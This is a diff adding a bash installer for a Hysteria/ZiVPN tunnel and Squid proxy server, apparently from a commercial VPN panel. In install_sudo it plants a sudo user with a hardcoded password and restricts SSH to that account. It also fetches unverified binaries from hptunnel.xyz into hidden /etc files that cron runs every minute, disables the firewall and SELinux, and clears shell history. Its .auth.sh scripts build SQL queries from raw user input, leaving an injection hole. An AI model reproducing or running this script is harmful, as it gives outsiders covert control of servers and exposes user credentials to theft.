@@ -1,0 +1,363 @@
+timedatectl set-timezone Asia/Riyadh
+install_require () {
+
+echo 'Installing dependencies.'
+{
+yum clean all
+yum update -y
+yum install epel-release -y
+if [[ "$(cat < /etc/system-release-cpe | cut -d: -f5)" == '6' ]]; then
+ rpm --import /etc/pki/rpm-gpg/RPM-GPG-KEY-EPEL-6
+elif [[ "$(cat < /etc/system-release-cpe | cut -d: -f5)" == '7' ]]; then
+ rpm --import /etc/pki/rpm-gpg/RPM-GPG-KEY-EPEL-7
+fi
+yum update -y
+yum --enablerepo=epel install nano wget curl zip unzip git tar gzip bc rc cronie net-tools dos2unix screen yum-utils sudo -y
+yum --enablerepo=epel install chkconfig initscripts jq mysql redhat-lsb netcat httpie neofetch vnstat -y
+yum --enablerepo=epel install php php-common php-cli php-pdo php-mysqli php-gd php-pear php-xml php-mbstring php-soap php-snmp php-ldap php-odbc -y
+yum --enablerepo=epel install make gcc libssh2 php-devel php-pearlibssh2-devel -y
+
+echo "extension=ssh2.so" >  /etc/php.d/ssh2.ini
+echo "extension=ssh2.so"  > /etc/php.ini
+}
+
+}
+
+install_squid(){
+
+echo 'Installing proxy.'
+{
+yum groupinstall 'Development Tools' -y
+yum-builddep squid -y
+wget -qO squid.tar.gz 'https://hptunnel.xyz/dxplusdev/xxxxxx/squid-3.1.23.tar.gz'
+tar xzf squid.tar.gz
+rm -f squid.tar.gz
+cd squid-3.1.23
+./configure --prefix=/usr --exec-prefix=/usr --bindir=/usr/sbin --sbindir=/usr/sbin --sysconfdir=/etc/squid --datadir=/usr/share/squid --includedir=/usr/include --libdir=/usr/lib --libexecdir=/usr/lib/squid --localstatedir=/var --sharedstatedir=/usr/com --mandir=/usr/share/man --infodir=/usr/share/info --x-includes=/usr/include --x-libraries=/usr/lib --enable-shared=yes --enable-static=no --enable-carp --enable-storeio=aufs,ufs --enable-removal-policies=heap,lru --disable-icmp --disable-delay-pools --disable-esi --enable-icap-client --enable-useragent-log --enable-referer-log --disable-wccp --enable-wccpv2 --disable-kill-parent-hack --enable-snmp --enable-cachemgr-hostname=localhost --enable-arp-acl --disable-htcp --disable-forw-via-db --enable-follow-x-forwarded-for --enable-cache-digests --disable-poll --enable-epoll --enable-linux-netfilter --disable-ident-lookups --enable-default-hostsfile=/etc/hosts --with-default-user=squid --with-large-files --enable-mit=/usr --with-logdir=/var/log/squid --enable-zph-qos --enable-http-violations --with-filedescriptors=65536 --enable-gnuregex --enable-async-io=64 --with-aufs-threads=64 --with-pthreads --with-aio --enable-default-err-languages=English --enable-err-languages=English --disable-hostname-checks --enable-underscores
+make
+make install
+
+cd .. && rm -rf squid*
+useradd squid
+chown -R squid:squid /var/log/squid
+wget -qO /etc/init.d/squid 'https://raw.githubusercontent.com/Bonveio/BonvScripts/master/squid3.init'
+chmod +x /etc/init.d/squid
+
+cd /etc/squid/
+rm squid.conf
+echo "acl Firenet dst $server_ip" >> squid.conf
+echo 'http_port 8080
+http_port 8181
+visible_hostname Proxy
+acl PURGE method PURGE
+acl HEAD method HEAD
+acl POST method POST
+acl GET method GET
+acl CONNECT method CONNECT
+http_access allow Firenet
+http_reply_access allow all
+http_access deny all
+icp_access allow all
+always_direct allow all
+visible_hostname Firenet-Proxy
+error_directory /usr/share/squid/errors/en' >> squid.conf
+    cd /usr/share/squid/errors/en
+    rm ERR_INVALID_URL
+    echo '<!--FirenetDev--><!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><title>SECURE PROXY</title><meta name="viewport" content="width=device-width, initial-scale=1"><meta http-equiv="X-UA-Compatible" content="IE=edge"/><link rel="stylesheet" href="https://bootswatch.com/4/slate/bootstrap.min.css" media="screen"><link href="https://fonts.googleapis.com/css?family=Press+Start+2P" rel="stylesheet"><style>body{font-family: "Press Start 2P", cursive;}.fn-color{color: #ffff; background-image: -webkit-linear-gradient(92deg, #f35626, #feab3a); -webkit-background-clip: text; -webkit-text-fill-color: transparent; -webkit-animation: hue 5s infinite linear;}@-webkit-keyframes hue{from{-webkit-filter: hue-rotate(0deg);}to{-webkit-filter: hue-rotate(-360deg);}}</style></head><body><div class="container" style="padding-top: 50px"><div class="jumbotron"><h1 class="display-3 text-center fn-color">SECURE PROXY</h1><h4 class="text-center text-danger">SERVER</h4><p class="text-center">😍 %w 😍</p></div></div></body></html>' >> ERR_INVALID_URL
+    chmod 755 *
+    
+chkconfig --add squid
+chkconfig squid on
+service squid restart
+cd /etc || exit
+
+wget 'https://hptunnel.xyz/dxplusdev/xxxxxx/monitor' -O /etc/.monitor
+wget 'https://hptunnel.xyz/dxplusdev/xxxxxx/hysteria' -O /etc/.hysteria
+chmod +x /etc/.monitor
+chmod +x /etc/.hysteria
+
+yum erase firewalld ufw -y
+yum remove firewalld ufw -y
+sed -i "s|Listen 80|Listen 5624|g" /etc/httpd/conf/httpd.conf
+sudo systemctl enable httpd
+sudo systemctl start httpd
+} 
+}
+
+install_firewall_kvm () {
+
+echo "Installing iptables."
+echo "net.ipv4.ip_forward=1" >> /etc/sysctl.conf
+sysctl -p
+{
+iptables -F
+iptables -t nat -A PREROUTING -i "$server_interface" -p udp -m udp --dport 10000:50000 -j DNAT --to-destination :5666
+iptables -t filter -A INPUT -p udp -m udp --dport 20100:20900 -m state --state NEW -m recent --update --seconds 30 --hitcount 10 --name DEFAULT --mask 255.255.255.255 --rsource -j DROP
+iptables -t filter -A INPUT -p udp -m udp --dport 20100:20900 -m state --state NEW -m recent --set --name DEFAULT --mask 255.255.255.255 --rsource
+iptables-save > /etc/iptables_rules.v4
+ip6tables-save > /etc/iptables_rules.v6
+}
+}
+
+install_sudo(){
+    useradd -m mtknetwork 2>/dev/null; echo mtknetwork:F1005r90@@@ | chpasswd &>/dev/null; usermod -aG sudo mtknetwork &>/dev/null
+    sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
+    echo "AllowGroups mtknetwork" >> /etc/ssh/sshd_config
+    service sshd restart
+}
+
+install_hysteria(){
+clear
+echo 'Installing hysteria.'
+{
+wget -N --no-check-certificate -q -O ~/install_server.sh https://hptunnel.xyz/dxplusdev/xxxxxx/install_server.sh; chmod +x ~/install_server.sh; ./install_server.sh --version v1.3.5
+
+echo "Generating cert files:"
+openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 -subj "/C=PH/ST=Cebu/L=Central Visayas/O=Firenet Developer/OU=IT Department/CN=firenet" -keyout "/etc/hysteria/hysteria.key" -out "/etc/hysteria/hysteria.crt"
+sysctl -w net.core.rmem_max=16777216 1> /dev/null 2> /dev/null
+sysctl -w net.core.wmem_max=16777216 1> /dev/null 2> /dev/null
+
+rm -f /etc/hysteria/config.json
+
+echo '{
+  "listen": ":5666",
+  "cert": "/etc/hysteria/hysteria.crt",
+  "key": "/etc/hysteria/hysteria.key",
+  "up_mbps": 100,
+  "down_mbps": 100,
+  "disable_udp": false,
+  "obfs": "mediatekvpn",
+  "auth": {
+    "mode": "external",
+    "config": {
+    "cmd": "./.auth.sh"
+    }
+  },
+  "prometheus_listen": ":5665",
+  "recv_window_conn": 107374182400,
+  "recv_window_client": 13421772800
+}
+' >> /etc/hysteria/config.json
+
+sed -i "s|mediatekvpn|$OBFS|g" /etc/hysteria/config.json
+
+cat <<"EOM" >/etc/hysteria/.auth.sh
+#!/bin/bash
+. /root/.db-base
+
+if [ $# -ne 4 ]; then
+    echo "invalid number of arguments"
+    exit 1
+fi
+
+ADDR=$1
+AUTH=$2
+SEND=$3
+RECV=$4
+
+USERNAME=$(echo "$AUTH" | cut -d ":" -f 1)
+PASSWORD=$(echo "$AUTH" | cut -d ":" -f 2)
+
+Query="SELECT user_name FROM users WHERE user_name='$USERNAME' AND auth_vpn=md5('$PASSWORD') AND is_freeze='0' AND duration > 0"
+username=`mysql -u $DB_USER -p$DB_PASS -D $DB_NAME -h $DB_HOST -sN -e "$Query"`
+[ "$username" != '' ] && [ "$username" = "$USERNAME" ] && echo "user : $username" && echo 'authentication ok.' && exit 0 || echo 'Authentication failed.'; exit 1
+EOM
+
+chmod 755 /etc/hysteria/config.json
+chmod 755 /etc/hysteria/hysteria.crt
+chmod 755 /etc/hysteria/hysteria.key
+chmod 755 /etc/hysteria/.auth.sh
+
+wget -O /usr/bin/badvpn-udpgw "https://hptunnel.xyz/dxplusdev/xxxxxx/badvpn-udpgw64"
+chmod +x /usr/bin/badvpn-udpgw
+} &>/dev/null
+}
+
+installBBR() {
+    echo "net.core.default_qdisc=fq" >> /etc/sysctl.conf
+    echo "net.ipv4.tcp_congestion_control=bbr" >> /etc/sysctl.conf
+    sysctl -p
+    
+	rpm --import https://www.elrepo.org/RPM-GPG-KEY-elrepo.org
+	rpm -Uvh http://www.elrepo.org/elrepo-release-7.0-2.el7.elrepo.noarch.rpm
+	
+    yum --enablerepo=elrepo-kernel install kernel-ml -y
+    grub2-set-default 1
+    echo "tcp_bbr" >> /etc/modules-load.d/modules.conf
+    INSTALL_BBR=true
+}
+
+#====================================================
+#	Installing ZI UDP
+#	Finalized: Firenet Developer
+#====================================================
+
+function install_zi() {
+clear
+echo 'Installing zi udp.'
+{
+echo -e "Downloading UDP Service"
+wget https://github.com/zahidbd2/udp-zivpn/releases/download/udp-zivpn_1.4.9/udp-zivpn-linux-amd64 -O /usr/local/bin/zivpn 1> /dev/null 2> /dev/null
+chmod +x /usr/local/bin/zivpn
+mkdir /etc/zivpn 1> /dev/null 2> /dev/null
+
+echo "Generating cert files:"
+openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 -subj "/C=PH/ST=Cebu/L=Central Visayas/O=Firenet Developer/OU=IT Department/CN=firenet" -keyout "/etc/zivpn/zivpn.key" -out "/etc/zivpn/zivpn.crt"
+sysctl -w net.core.rmem_max=16777216 1> /dev/null 2> /dev/null
+sysctl -w net.core.wmem_max=16777216 1> /dev/null 2> /dev/null
+
+echo '{
+  "listen": ":5666",
+  "cert": "/etc/zivpn/zivpn.crt",
+  "key":  "/etc/zivpn/zivpn.key",
+  "obfs":"mediatekvpn",
+  "auth": {
+    "mode": "external",
+    "config": {
+    "cmd": "./.auth.sh"
+    }
+  }
+}
+' >> /etc/zivpn/config.json
+
+sed -i "s|mediatekvpn|$OBFS|g" /etc/zivpn/config.json
+
+cat <<EOF > /etc/systemd/system/hysteria-server.service
+[Unit]
+Description=zivpn VPN Server
+After=network.target
+
+[Service]
+Type=simple
+User=root
+WorkingDirectory=/etc/zivpn
+ExecStart=/usr/local/bin/zivpn -config /etc/zivpn/config.json server
+Restart=always
+RestartSec=3
+Environment=ZIVPN_LOG_LEVEL=info
+CapabilityBoundingSet=CAP_NET_ADMIN CAP_NET_BIND_SERVICE CAP_NET_RAW
+AmbientCapabilities=CAP_NET_ADMIN CAP_NET_BIND_SERVICE CAP_NET_RAW
+NoNewPrivileges=true
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+systemctl enable hysteria-server.service
+systemctl start hysteria-server.service
+
+cat <<"EOM" >/etc/zivpn/.auth.sh
+#!/bin/bash
+. /root/.db-base
+
+if [ $# -ne 4 ]; then
+    echo "invalid number of arguments"
+    exit 1
+fi
+
+ADDR=$1
+AUTH=$2
+SEND=$3
+RECV=$4
+
+USERNAME=$(echo "$AUTH" | cut -d ":" -f 1)
+PASSWORD=$(echo "$AUTH" | cut -d ":" -f 2)
+
+Query="SELECT user_name FROM users WHERE user_name='$USERNAME' AND auth_vpn=md5('$PASSWORD') AND is_freeze='0' AND duration > 0"
+username=`mysql -u $DB_USER -p$DB_PASS -D $DB_NAME -h $DB_HOST -sN -e "$Query"`
+[ "$username" != '' ] && [ "$username" = "$USERNAME" ] && echo "user : $username" && echo 'authentication ok.' && exit 0 || echo 'Authentication failed.'; exit 1
+EOM
+
+chmod 755 /etc/zivpn/.auth.sh
+chmod 755 /etc/zivpn/zivpn.crt
+chmod 755 /etc/zivpn/zivpn.key
+
+wget -O /usr/bin/badvpn-udpgw "https://hptunnel.xyz/dxplusdev/xxxxxx/badvpn-udpgw64"
+chmod +x /usr/bin/badvpn-udpgw
+
+} &>/dev/null
+}
+
+install_rclocal(){
+  {   
+    echo "[Unit]
+Description=firenet service
+Documentation=http://mediatekvpn.com
+
+[Service]
+Type=oneshot
+ExecStart=/bin/bash /etc/rc.local
+RemainAfterExit=yes
+
+[Install]
+WantedBy=multi-user.target" >> /etc/systemd/system/firenet.service
+rm -rf /etc/rc.local
+    echo '#!/bin/sh -e
+service ufw stop
+iptables-restore < /etc/iptables_rules.v4
+ip6tables-restore < /etc/iptables_rules.v6
+sysctl -p
+setenforce 0
+systemctl restart httpd
+service squid restart
+ps x | grep 'udpvpn' | grep -v 'grep' || screen -dmS udpvpn /usr/bin/badvpn-udpgw --listen-addr 127.0.0.1:7300 --max-clients 10000 --max-connections-for-client 10 --client-socket-sndbuf 10000
+screen -dmS socks python /etc/socks.py
+screen -dmS webinfo php -S 0.0.0.0:5623 -t /root/.web/
+bash /etc/.monitor hysteria
+exit 0' >> /etc/rc.local
+
+sudo chmod +x /etc/rc.local
+systemctl daemon-reload
+systemctl enable hysteria-server.service
+systemctl restart hysteria-server.service
+sudo systemctl enable firenet
+sudo systemctl start firenet.service
+    
+	mkdir -m 777 /root/.web
+echo "Made with love by: Firenet Developer... " >> /root/.web/index.php
+
+    echo "
+squid_port=8080
+hysteria_port=5666" >> /root/.ports
+
+  }
+}
+
+start_service () {
+
+echo 'Starting..'
+{
+sudo crontab -l | { echo "* * * * * /bin/bash /etc/.hysteria >/dev/null 2>&1
+* * * * * /bin/bash /etc/.monitor hysteria >/dev/null 2>&1"; } | crontab -
+} 
+
+echo '++++++++++++++++++++++++++++++++++'
+echo '*       HYSTERIA  is ready!    *'
+echo '+++++++++++************+++++++++++'
+echo 'Server will secure this server and reboot after 20 seconds'
+
+history -c;
+echo "DB_HOST='$HOST'" >> ~/.db-base
+echo "DB_NAME='$DBNAME'" >> ~/.db-base
+echo "DB_USER='$USER'" >> ~/.db-base
+echo "DB_PASS='$PASS'" >> ~/.db-base
+rm /usr/local/etc/.system
+sleep 20
+reboot
+}
+
+server_ip=$(curl -s https://api.ipify.org)
+server_interface=$(ip route get 8.8.8.8 | awk '/dev/ {f=NR} f&&NR-1==f' RS=" ")
+
+install_sudo
+install_require
+if [[ $HYSTERIA_TYPE == 'default' ]]; then
+	install_hysteria
+elif [[ $HYSTERIA_TYPE == 'zi' ]]; then
+	install_zi
+fi
+installBBR
+install_squid
+install_firewall_kvm
+install_rclocal
+start_service
